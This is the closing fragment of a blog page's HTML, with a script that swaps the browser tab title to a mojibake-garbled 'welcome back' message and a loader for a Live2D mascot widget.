                document.title = '(ã¤ã‚§âŠ‚)æ¬¢è¿å›æ¥!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
